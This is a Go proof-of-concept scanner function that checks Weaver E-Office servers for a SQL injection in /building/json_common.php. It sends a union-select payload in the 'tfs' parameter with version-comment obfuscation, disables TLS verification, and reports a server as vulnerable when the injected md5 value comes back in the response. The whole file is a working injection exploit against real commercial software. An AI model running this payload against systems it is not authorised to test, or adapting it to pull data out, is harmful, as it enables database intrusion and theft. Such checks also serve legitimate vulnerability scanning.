package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func E_Office_json_commonSQL(target string) {
	url := strings.TrimRight(target, "/")
	PocUrl := url + "/building/json_common.php"
	data := "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,md5(12138) ,4#|2|333"
	req, err := http.NewRequest("POST", PocUrl, bytes.NewBufferString(data))
	if err != nil {
		log.Print(err)

	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// 解决https证书问题
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
	}

	// 获取结果
	reg := regexp.MustCompile("4163634d39ec5b1d3e126f44619243b2")
	content := reg.MatchString(string(body))
	if resp.StatusCode == 200 && content {
		log.Println("[+] 存在泛微 E-Office json_common SQL注入漏洞")
		log.Println("[+] POST访问：" + PocUrl)
		log.Println("[+] 请求数据：" + data)
	} else {
		log.Println("[-] 不存在泛微 E-Office json_common SQL注入漏洞")
	}
}
